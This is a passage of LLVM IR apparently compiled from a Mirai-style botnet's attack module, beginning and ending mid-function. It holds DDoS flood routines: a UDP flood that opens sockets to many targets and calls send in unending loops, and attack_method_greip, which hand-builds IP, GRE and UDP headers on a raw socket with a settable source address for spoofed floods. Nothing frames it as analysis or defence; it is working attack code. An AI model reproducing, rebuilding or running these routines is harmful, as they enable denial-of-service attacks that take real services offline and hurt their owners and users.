  %36 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  %38 = call i32 @rand_next() #7
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %39, i16* %41, align 2
  %42 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %43 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %42, i32* %43, align 4
  %44 = icmp eq i32 %42, -1
  br i1 %44, label %.us-lcssa.us.loopexit, label %45

; <label>:45:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %31, align 4
  store i16 %.058, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %46 = call i32 @bind(i32 %42, %struct.sockaddr* nonnull %34, i32 16) #7
  %47 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %48 = load i8, i8* %47, align 4
  %49 = icmp ult i8 %48, 32
  br i1 %49, label %50, label %61

; <label>:50:                                     ; preds = %45
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @ntohl(i32 %52) #8
  %54 = call i32 @rand_next() #7
  %55 = load i8, i8* %47, align 4
  %56 = zext i8 %55 to i32
  %57 = lshr i32 %54, %56
  %58 = add i32 %57, %53
  %59 = call i32 @htonl(i32 %58) #8
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %59, i32* %60, align 4
  br label %61

; <label>:61:                                     ; preds = %50, %45
  %62 = bitcast %struct.attack_target* %40 to %struct.sockaddr*
  %63 = call i32 @connect(i32 %42, %struct.sockaddr* %62, i32 16) #7
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %64 = icmp slt i64 %indvars.iv.next, %35
  br i1 %64, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %61
  br label %.preheader

.preheader.loopexit78:                            ; preds = %107
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %65 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %66 = zext i32 %.mask to i64
  br i1 %28, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %65, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %65, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %67 = sext i32 %.160.us61 to i64
  %68 = getelementptr inbounds i8*, i8** %8, i64 %67
  %69 = load i8*, i8** %68, align 8
  call void @rand_str(i8* %69, i32 %.mask) #7
  %70 = getelementptr inbounds i32, i32* %10, i64 %67
  %71 = load i32, i32* %70, align 4
  %72 = call i64 @send(i32 %71, i8* %69, i64 %66, i32 16384) #7
  %73 = add nsw i32 %.160.us61, 1
  %74 = icmp slt i32 %73, %27
  %brmerge66 = or i1 %74, %.not
  %.mux67 = select i1 %74, i32 %73, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %75 = sext i32 %.160.us.us to i64
  %76 = getelementptr inbounds i8*, i8** %8, i64 %75
  %77 = load i8*, i8** %76, align 8
  %78 = getelementptr inbounds i32, i32* %10, i64 %75
  %79 = load i32, i32* %78, align 4
  %80 = call i64 @send(i32 %79, i8* %77, i64 %66, i32 16384) #7
  %81 = add nsw i32 %.160.us.us, 1
  %82 = icmp slt i32 %81, %27
  %brmerge = or i1 %82, %65
  %.mux = select i1 %82, i32 %81, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %107
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %107 ], [ 0, %.lr.ph65.split.preheader ]
  %83 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %84 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %83, i8** %84, align 8
  %85 = call zeroext i16 @htons(i16 zeroext %12) #8
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %85, i16* %87, align 2
  %88 = call i32 @socket(i32 2, i32 2, i32 17) #7
  %89 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %88, i32* %89, align 4
  %90 = icmp eq i32 %88, -1
  br i1 %90, label %.us-lcssa.us.loopexit77, label %91

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:91:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %31, align 4
  store i16 %.058, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %92 = call i32 @bind(i32 %88, %struct.sockaddr* nonnull %34, i32 16) #7
  %93 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %94 = load i8, i8* %93, align 4
  %95 = icmp ult i8 %94, 32
  br i1 %95, label %96, label %107

; <label>:96:                                     ; preds = %91
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %98 = load i32, i32* %97, align 4
  %99 = call i32 @ntohl(i32 %98) #8
  %100 = call i32 @rand_next() #7
  %101 = load i8, i8* %93, align 4
  %102 = zext i8 %101 to i32
  %103 = lshr i32 %100, %102
  %104 = add i32 %103, %99
  %105 = call i32 @htonl(i32 %104) #8
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %105, i32* %106, align 4
  br label %107

; <label>:107:                                    ; preds = %96, %91
  %108 = bitcast %struct.attack_target* %86 to %struct.sockaddr*
  %109 = call i32 @connect(i32 %88, %struct.sockaddr* %108, i32 16) #7
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %110 = icmp slt i64 %indvars.iv.next71, %35
  br i1 %110, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare void @rand_str(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #7
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %4
  %21 = tail call i32 @rand_next() #7
  %22 = trunc i32 %21 to i16
  br label %26

; <label>:23:                                     ; preds = %4
  %24 = trunc i32 %13 to i16
  %25 = tail call zeroext i16 @htons(i16 zeroext %24) #8
  br label %26

; <label>:26:                                     ; preds = %23, %20
  %.058 = phi i16 [ %22, %20 ], [ %25, %23 ]
  %27 = zext i8 %0 to i32
  %28 = icmp eq i8 %0, 0
  br i1 %28, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %26
  br label %.preheader.split

.lr.ph65:                                         ; preds = %26
  %29 = and i32 %11, 65535
  %30 = icmp eq i32 %29, 65535
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = zext i8 %0 to i64
  br i1 %30, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %62
  %indvars.iv = phi i64 [ %indvars.iv.next, %62 ], [ 0, %.lr.ph65.split.us.preheader ]
  %36 = call i32 @rand() #7
  %37 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %38 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %37, i8** %38, align 8
  %39 = call i32 @rand_next() #7
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %40, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %.us-lcssa.us.loopexit, label %46

; <label>:46:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %31, align 4
  store i16 %.058, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %47 = call i32 @bind(i32 %43, %struct.sockaddr* nonnull %34, i32 16) #7
  %48 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %49 = load i8, i8* %48, align 4
  %50 = icmp ult i8 %49, 32
  br i1 %50, label %51, label %62

; <label>:51:                                     ; preds = %46
  %52 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @ntohl(i32 %53) #8
  %55 = call i32 @rand_next() #7
  %56 = load i8, i8* %48, align 4
  %57 = zext i8 %56 to i32
  %58 = lshr i32 %55, %57
  %59 = add i32 %58, %54
  %60 = call i32 @htonl(i32 %59) #8
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %60, i32* %61, align 4
  br label %62

; <label>:62:                                     ; preds = %51, %46
  %63 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %64 = call i32 @connect(i32 %43, %struct.sockaddr* %63, i32 16) #7
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %65 = icmp slt i64 %indvars.iv.next, %35
  br i1 %65, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %62
  br label %.preheader

.preheader.loopexit78:                            ; preds = %109
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %66 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %67 = zext i32 %.mask to i64
  br i1 %28, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %66, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %66, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %68 = sext i32 %.160.us61 to i64
  %69 = getelementptr inbounds i8*, i8** %8, i64 %68
  %70 = load i8*, i8** %69, align 8
  call void @rand_str(i8* %70, i32 %.mask) #7
  %71 = getelementptr inbounds i32, i32* %10, i64 %68
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %70, i64 %67, i32 16384) #7
  %74 = add nsw i32 %.160.us61, 1
  %75 = icmp slt i32 %74, %27
  %brmerge66 = or i1 %75, %.not
  %.mux67 = select i1 %75, i32 %74, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %76 = sext i32 %.160.us.us to i64
  %77 = getelementptr inbounds i8*, i8** %8, i64 %76
  %78 = load i8*, i8** %77, align 8
  %79 = getelementptr inbounds i32, i32* %10, i64 %76
  %80 = load i32, i32* %79, align 4
  %81 = call i64 @send(i32 %80, i8* %78, i64 %67, i32 16384) #7
  %82 = add nsw i32 %.160.us.us, 1
  %83 = icmp slt i32 %82, %27
  %brmerge = or i1 %83, %66
  %.mux = select i1 %83, i32 %82, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %109
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %109 ], [ 0, %.lr.ph65.split.preheader ]
  %84 = call i32 @rand() #7
  %85 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %86 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %85, i8** %86, align 8
  %87 = call zeroext i16 @htons(i16 zeroext %12) #8
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %87, i16* %89, align 2
  %90 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %91 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %90, i32* %91, align 4
  %92 = icmp eq i32 %90, -1
  br i1 %92, label %.us-lcssa.us.loopexit77, label %93

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:93:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %31, align 4
  store i16 %.058, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %94 = call i32 @bind(i32 %90, %struct.sockaddr* nonnull %34, i32 16) #7
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %96 = load i8, i8* %95, align 4
  %97 = icmp ult i8 %96, 32
  br i1 %97, label %98, label %109

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %100 = load i32, i32* %99, align 4
  %101 = call i32 @ntohl(i32 %100) #8
  %102 = call i32 @rand_next() #7
  %103 = load i8, i8* %95, align 4
  %104 = zext i8 %103 to i32
  %105 = lshr i32 %102, %104
  %106 = add i32 %105, %101
  %107 = call i32 @htonl(i32 %106) #8
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %107, i32* %108, align 4
  br label %109

; <label>:109:                                    ; preds = %98, %93
  %110 = bitcast %struct.attack_target* %88 to %struct.sockaddr*
  %111 = call i32 @connect(i32 %90, %struct.sockaddr* %110, i32 16) #7
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %112 = icmp slt i64 %indvars.iv.next71, %35
  br i1 %112, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %344, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #7
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %103, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre = sext i32 %21 to i64
  %.pre130 = add nsw i64 %.pre, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre130 to i16
  %37 = icmp eq i8 %16, 0
  %38 = add nsw i64 %.pre, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre, 8
  %43 = trunc i64 %42 to i16
  br i1 %37, label %.lr.ph127.split.preheader, label %.lr.ph127.split.us.preheader

.lr.ph127.split.us.preheader:                     ; preds = %.lr.ph127
  br label %.lr.ph127.split.us

.lr.ph127.split.preheader:                        ; preds = %.lr.ph127
  br label %.lr.ph127.split

.lr.ph127.split.us:                               ; preds = %.lr.ph127.split.us.preheader, %89
  %44 = phi i32 [ %101, %89 ], [ 0, %.lr.ph127.split.us.preheader ]
  %45 = call noalias i8* @calloc(i64 1458, i64 8) #7
  %46 = sext i32 %44 to i64
  %47 = getelementptr inbounds i8*, i8** %8, i64 %46
  store i8* %45, i8** %47, align 8
  %48 = getelementptr inbounds i8, i8* %45, i64 24
  %49 = getelementptr inbounds i8, i8* %45, i64 44
  store i8 69, i8* %45, align 4
  %50 = getelementptr inbounds i8, i8* %45, i64 1
  store i8 %10, i8* %50, align 1
  %51 = call zeroext i16 @htons(i16 zeroext %36) #8
  %52 = getelementptr inbounds i8, i8* %45, i64 2
  %53 = bitcast i8* %52 to i16*
  store i16 %51, i16* %53, align 2
  %54 = call zeroext i16 @htons(i16 zeroext %12) #8
  %55 = getelementptr inbounds i8, i8* %45, i64 4
  %56 = bitcast i8* %55 to i16*
  store i16 %54, i16* %56, align 4
  %57 = getelementptr inbounds i8, i8* %45, i64 8
  store i8 %14, i8* %57, align 4
  %58 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %59 = getelementptr inbounds i8, i8* %45, i64 6
  %60 = bitcast i8* %59 to i16*
  store i16 %58, i16* %60, align 2
  %61 = getelementptr inbounds i8, i8* %45, i64 9
  store i8 47, i8* %61, align 1
  %62 = getelementptr inbounds i8, i8* %45, i64 12
  %63 = bitcast i8* %62 to i32*
  store i32 %27, i32* %63, align 4
  %64 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %46, i32 1
  %65 = load i32, i32* %64, align 4
  %66 = getelementptr inbounds i8, i8* %45, i64 16
  %67 = bitcast i8* %66 to i32*
  store i32 %65, i32* %67, align 4
  %68 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %69 = getelementptr inbounds i8, i8* %45, i64 22
  %70 = bitcast i8* %69 to i16*
  store i16 %68, i16* %70, align 2
  store i8 69, i8* %48, align 4
  %71 = getelementptr inbounds i8, i8* %45, i64 25
  store i8 %10, i8* %71, align 1
  %72 = call zeroext i16 @htons(i16 zeroext %39) #8
  %73 = getelementptr inbounds i8, i8* %45, i64 26
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  %75 = call zeroext i16 @htons(i16 zeroext %40) #8
  %76 = getelementptr inbounds i8, i8* %45, i64 28
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 4
  %78 = getelementptr inbounds i8, i8* %45, i64 32
  store i8 %14, i8* %78, align 4
  %79 = getelementptr inbounds i8, i8* %45, i64 30
  %80 = bitcast i8* %79 to i16*
  store i16 %58, i16* %80, align 2
  %81 = getelementptr inbounds i8, i8* %45, i64 33
  store i8 17, i8* %81, align 1
  %82 = call i32 @rand_next() #7
  %83 = getelementptr inbounds i8, i8* %45, i64 36
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 4
  br i1 %41, label %87, label %85

; <label>:85:                                     ; preds = %.lr.ph127.split.us
  %86 = load i32, i32* %67, align 4
  br label %89

; <label>:87:                                     ; preds = %.lr.ph127.split.us
  %88 = sub i32 1023, %82
  br label %89

; <label>:89:                                     ; preds = %87, %85
  %.sink.us = phi i32 [ %88, %87 ], [ %86, %85 ]
  %90 = getelementptr inbounds i8, i8* %45, i64 40
  %91 = bitcast i8* %90 to i32*
  store i32 %.sink.us, i32* %91, align 4
  %92 = call zeroext i16 @htons(i16 zeroext %18) #8
  %93 = bitcast i8* %49 to i16*
  store i16 %92, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %20) #8
  %95 = getelementptr inbounds i8, i8* %45, i64 46
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = call zeroext i16 @htons(i16 zeroext %43) #8
  %98 = getelementptr inbounds i8, i8* %45, i64 48
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 2
  %100 = load i32, i32* %5, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %5, align 4
  %102 = icmp slt i32 %101, %34
  br i1 %102, label %.lr.ph127.split.us, label %.preheader.loopexit137

; <label>:103:                                    ; preds = %30
  %104 = call i32 @close(i32 %28) #7
  br label %344

.preheader.loopexit:                              ; preds = %155
  br label %.preheader

.preheader.loopexit137:                           ; preds = %89
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit137, %.preheader.loopexit, %.preheader125
  %105 = icmp eq i32 %27, -1
  %106 = and i32 %11, 65535
  %107 = icmp eq i32 %106, 65535
  %108 = and i32 %17, 65535
  %109 = icmp eq i32 %108, 65535
  %110 = and i32 %19, 65535
  %111 = icmp eq i32 %110, 65535
  %112 = icmp eq i8 %25, 0
  %113 = icmp eq i8 %23, 0
  %114 = add i32 %21, 8
  br label %.loopexit

.lr.ph127.split:                                  ; preds = %.lr.ph127.split.preheader, %155
  %115 = phi i32 [ %167, %155 ], [ 0, %.lr.ph127.split.preheader ]
  %116 = call noalias i8* @calloc(i64 1458, i64 8) #7
  %117 = sext i32 %115 to i64
  %118 = getelementptr inbounds i8*, i8** %8, i64 %117
  store i8* %116, i8** %118, align 8
  %119 = getelementptr inbounds i8, i8* %116, i64 24
  %120 = getelementptr inbounds i8, i8* %116, i64 44
  store i8 69, i8* %116, align 4
  %121 = getelementptr inbounds i8, i8* %116, i64 1
  store i8 %10, i8* %121, align 1
  %122 = call zeroext i16 @htons(i16 zeroext %36) #8
  %123 = getelementptr inbounds i8, i8* %116, i64 2
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %125 = call zeroext i16 @htons(i16 zeroext %12) #8
  %126 = getelementptr inbounds i8, i8* %116, i64 4
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 4
  %128 = getelementptr inbounds i8, i8* %116, i64 8
  store i8 %14, i8* %128, align 4
  %129 = getelementptr inbounds i8, i8* %116, i64 9
  store i8 47, i8* %129, align 1
  %130 = getelementptr inbounds i8, i8* %116, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 %27, i32* %131, align 4
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %117, i32 1
  %133 = load i32, i32* %132, align 4
  %134 = getelementptr inbounds i8, i8* %116, i64 16
  %135 = bitcast i8* %134 to i32*
  store i32 %133, i32* %135, align 4
  %136 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %137 = getelementptr inbounds i8, i8* %116, i64 22
  %138 = bitcast i8* %137 to i16*
  store i16 %136, i16* %138, align 2
  store i8 69, i8* %119, align 4
  %139 = getelementptr inbounds i8, i8* %116, i64 25
  store i8 %10, i8* %139, align 1
  %140 = call zeroext i16 @htons(i16 zeroext %39) #8
  %141 = getelementptr inbounds i8, i8* %116, i64 26
  %142 = bitcast i8* %141 to i16*
  store i16 %140, i16* %142, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %40) #8
  %144 = getelementptr inbounds i8, i8* %116, i64 28
  %145 = bitcast i8* %144 to i16*
  store i16 %143, i16* %145, align 4
  %146 = getelementptr inbounds i8, i8* %116, i64 32
  store i8 %14, i8* %146, align 4
  %147 = getelementptr inbounds i8, i8* %116, i64 33
  store i8 17, i8* %147, align 1
  %148 = call i32 @rand_next() #7
  %149 = getelementptr inbounds i8, i8* %116, i64 36
  %150 = bitcast i8* %149 to i32*
  store i32 %148, i32* %150, align 4
  br i1 %41, label %153, label %151

; <label>:151:                                    ; preds = %.lr.ph127.split
  %152 = load i32, i32* %135, align 4
  br label %155

; <label>:153:                                    ; preds = %.lr.ph127.split
  %154 = sub i32 1023, %148
  br label %155

